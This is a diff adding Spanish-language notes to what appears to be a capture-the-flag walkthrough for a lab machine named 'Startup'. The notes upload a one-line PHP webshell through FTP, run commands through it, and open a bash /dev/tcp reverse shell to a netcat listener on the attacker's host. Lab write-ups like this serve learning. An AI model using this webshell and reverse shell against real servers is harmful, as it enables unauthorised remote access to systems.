@@ -99,6 +99,31 @@ Esto aparece en tu máquina Startup.
 máquina STARTUP
 
 9️⃣ REVERSE SHELL DESDE FTP
+Te conectas al FTP
+ftp 10.10.10.5
+Ves los archivos
+ls
+Salida:
+index.html
+uploads
+images
+
+Subes la webshell
+nano shell.php
+<?php system($_GET['cmd']); ?>
+put shell.php
+
+Accedes desde el navegador
+http://victima/shell.php
+
+Ahora puedes ejecutar comandos:
+
+http://victima/shell.php?cmd=id
+
+Resultado:
+
+uid=33(www-data)
+
 
 Primero escuchar:
 
@@ -107,6 +132,13 @@ nc -lvnp 4444
 Luego ejecutar en la webshell:
 
 bash -c 'bash -i >& /dev/tcp/IPKALI/4444 0>&1'
+
+http://victima/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
+
+Y eso ejecuta la reverse shell.
+
+
+
 
 
 
